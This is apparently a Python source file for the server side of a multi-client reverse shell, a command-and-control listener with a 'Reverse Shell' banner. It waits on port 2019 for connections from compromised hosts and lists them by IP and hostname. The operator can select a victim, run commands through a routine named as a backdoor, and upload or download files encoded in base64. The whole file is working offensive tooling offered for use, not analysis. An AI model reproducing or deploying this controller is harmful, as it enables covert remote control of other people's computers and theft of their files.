#!/usr/bin/env python 3.7.2
# -*- coding: utf-8 -*-
import socket
import json
import base64
from queue import Queue
import threading
import os
from termcolor import colored
import sys

class Listener:
    def __init__(self,ip,port):
        self.about()
        self.threads = 2
        self.jobs = [1, 2]
        self.queue = Queue()
        self.ip=ip
        self.port=port
        self.connections = []
        self.addresses = []
        self.connection=None
        self.active_target=None
        self.quit=True
        self.cwd=None
        self.cwd_status=True
        self.commands = {'help:': "Provides information about application usage.",
                         'list:': "Lists connected computers.",
                         'select:': "Used to select connected computers. Selection is made according to the index numbers of listed computers.",
                         'quit:': "Used to disconnect from the selected computer.",
                         'exit:': "Stops the server. Exits the application.",
                         'upload:': "Uploads file to the selected target machine. This command works after selecting target computer.",
                         'download:': "Downloads file from the selected target machine. This command works after selecting target computer.",
                    }
        print(self.color_message("[+] Server Started.",1))
        print(self.color_message("[+] Waiting for incoming connections...",1))


    def help(self):
        for command, description in self.commands.items():
            print(self.color_message(command, 1) + "\t" + description)

    def color_message(self,message,status):
        if status==1:
            return colored(message,"green")
        elif status==2:
            return colored(message,"red")
        elif status==3:
            return colored(message,"blue")


    def create_thread(self):
        for _ in range(self.threads):
            work = threading.Thread(target=self.task)
            work.daemon = True
            work.start()

    def task(self):
        while True:
            x = self.queue.get()
            if x == 1:
                self.socket_listen()
            if x == 2:
                self.listener_command_execute()
            try:
                self.queue.task_done()
            except:
                pass

    def create_task(self):
        for job in self.jobs:
            self.queue.put(job)
        self.queue.join()

    def socket_listen(self):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((self.ip, self.port))
        listener.listen(0)
        for connection in self.connections:
            connection.close()
        self.connections = []
        self.addresses = []
        while 1:
            try:
                connection, address = listener.accept()
                connection.setblocking(1)
                address = address + (str(connection.recv(1024), "utf-8"),)
                self.connections.append(connection)
                self.addresses.append(address)
                print(self.color_message("\n[+] Connection established from " + address[-1] + " (" + address[0] + ")",1))

                if self.quit==True:
                    print(self.color_message("listener >> ",3),end="")
                else:
                    if self.connection.getpeername()[0]==connection.getpeername()[0]:
                        self.cwd_status = False
                        self.active_connection_disconnect(False)
                    else:
                        self.cwd=self.execute_command(["getcwd"])
                        print(self.color_message(self.cwd,3),end="")
            except Exception as e:
                print(self.color_message("[-] Error during target connection",2))
                print(self.color_message("[-] Error message:"+str(e),2))
                self.cwd_status = False
                self.active_connection_disconnect(False)

    def listener_command_execute(self,status=True):
        while status:
            command = input(self.color_message('listener >> ', 3))
            if command == 'list':
                self.list()
            elif "select" in command:
                if len(command.split(" "))>1:
                    self.connection,self.active_target = self.select_target(command)
                    if self.connection is not None:
                        self.quit=False
                        self.backdoor_command_execute()
                else:
                    print(self.color_message("[-] Please select a target!",2))
            elif command == "help":
                self.help()
            elif command == 'exit':
                try:
                    self.queue.task_done()
                    self.queue.task_done()
                except:
                    continue
                print(self.color_message("[*] Exited from server",1))
                break
            else:
                print(self.color_message("[-] Command could not be processed!",2))
                print(self.color_message("[*] Enter 'help' command for application usage!", 2))
        if self.cwd_status == False:
            print(self.cwd,end="")
            self.cwd_status = True

    def list(self,status=True):
        result = ''
        for i, connection in enumerate(self.connections):
            try:
                connection.send(str.encode(" "))
            except Exception:
                del self.connections[i]
                del self.addresses[i]
                continue
            if status:
                result += str(i) + "\t" + str(self.addresses[i][0]) + "\t" + str(self.addresses[i][1]) + "\t" + str(self.addresses[i][2]) + "\n"
        if status:
            print(self.color_message("*_______________Clients________________*",3))
            print(self.color_message("index\tIp Address\tPort\tHostname",3))
            print(self.color_message(result,1))

    def select_target(self,index):
        try:
            index = index.replace('select ', '')
            index = int(index)
        except:
            print(self.color_message("[-] Please select a valid target",2))
            return None,None
        try:
            connection = self.connections[index]
            connection.send(str.encode(" "))
            print(self.color_message("[+] Connected to " + str(self.addresses[index][2]) + " (" + str( self.addresses[index][0]) + ") computer",1))
            return connection,index

        except:
            if len(self.connections) > index:
                del self.connections[index]
                del self.addresses[index]
            print(self.color_message("[-] Please select a valid target",2))
            return None,None


    def active_connection_disconnect(self,status=True):
        self.active_connection_reset()
        self.list(False)
        if status:
            self.listener_command_execute()
        else:
            self.listener_command_execute(False)

    def active_connection_reset(self):
        self.connection=None
        self.quit=True
        if self.active_target:
            del self.connections[self.active_target]
            del self.addresses[self.active_target]
            self.active_target=None


    def execute_command(self, command):
        try:
            if self.connection:
                self.send(command)
                return self.receive()
            else:
                print(self.color_message("[-] The target computer you were working on has been disconnected...", 2))
                print(self.color_message("[-] Connection Closed!", 2))
                self.active_connection_reset()
        except Exception as e:
            print(self.color_message("[-] The target computer you were working on has been disconnected...", 2))
            print(self.color_message("[-] Error message: " + str(e), 2))
            print(self.color_message("[-] Connection Closed!", 2))
            self.active_connection_reset()


    def send(self,data):
        json_data = json.dumps(data)
        self.connection.send(str.encode(json_data))

    def receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + str(self.connection.recv(1024),"utf-8")
                return json.loads(json_data)
            except ValueError:
                continue
            except:
                break

    def check_file(self, file):
        return os.path.isfile(path=file)

    def write_file(self,path,content):
        try:
            with open(path,"wb") as file:
                file.write(base64.b64decode(content))
                return self.color_message("[+] Download Successful!",1)
        except Exception as e:
            return self.color_message("[-] File download failed!"+"\n[-] Error message:"+str(e),2)

    def read_file(self, file):
        try:
            with open(file, "rb") as file:
                return str(base64.b64encode(file.read()),"utf-8")
        except Exception as e:
            return self.color_message("[-] File upload failed \n[-] Error message:"+str(e),2)

    def backdoor_command_execute(self):
        cwd=self.receive()
        if cwd:
            print(self.color_message(cwd,3), end="")

        while not self.quit:
            try:
                status = True
                command = input("")
                if command:
                    command = command.split(" ")
                    if command[0] == "upload":
                        if len(command) > 1:
                            if self.check_file(command[1]):
                                file = self.read_file(command[1])
                                command.append(file)
                            else:
                                result = self.color_message("[-] File '" + command[1] + "' does not exist to upload!",2)
                                status = False
                        else:
                            result = self.color_message("[-] Please specify the file to upload!",2)
                            status = False

                    if command[0] == "download":
                        if len(command) > 1:

                            result = self.execute_command(command)
                            if result:
                                self.cwd=result[result.rfind("\n\n"):]
                    elif status:
                        result = self.execute_command(command)
                        if result:
                            self.cwd=result[result.rfind("\n\n"):]
                    else:
                        self.cwd = self.execute_command(["getcwd"])
                        result += self.cwd

                    if command[0] == "download":
                        if len(command) > 1:
                            if "[-]" not in result:
                                result = self.write_file(command[1], result)
                        else:
                            result = self.color_message("[-] Please specify the file to download!",2)

                    elif command[0] == "quit":
                        break
                else:
                    self.cwd=self.execute_command(["getcwd"])
                    result = self.color_message(self.cwd, 3)

                if result:
                    print(result, end='')
                    if command:
                        if command[0] == "download":
                            self.cwd = self.execute_command(["getcwd"])
                            print(self.color_message(self.cwd,3), end='')

            except Exception as e:
                print(self.color_message("[-] Error during command execution: "+ str(e),2))

        print("\n[*] Exited")
        self.active_connection_reset()

    def about(self):
        print(self.color_message("  _____                                 _____ _          _ _ ", 1))
        print(self.color_message(" |  __ \                               / ____| |        | | |", 1))
        print(self.color_message(" | |__) |_____   _____ _ __ ___  ___  | (___ | |__   ___| | |", 1))
        print(self.color_message(" |  _  // _ \ \ / / _ \ '__/ __|/ _ \  \___ \| '_ \ / _ \ | |", 1))
        print(self.color_message(" | | \ \  __/\ V /  __/ |  \__ \  __/  ____) | | | |  __/ | |", 1))
        print(self.color_message(" |_|  \_\___| \_/ \___|_|  |___/\___| |_____/|_| |_|\___|_|_|", 1))
        print(self.color_message("# ==============================================================================",1))
        print(self.color_message("# author      	:", 1) + "necouncil")
        print(self.color_message("# github      	:", 1) + "https://github.com/necouncil")
        print(self.color_message("# version     	:", 1) + "1.0")
        print(self.color_message("# date        	:", 1) + "01.03.2026")
        print(self.color_message("# ==============================================================================",1))

try:
    listener = Listener('',2019)
    listener.create_thread()
    listener.create_task()
except:
    print(listener.color_message("\n\n[*] Exited from server",1))
    sys.exit()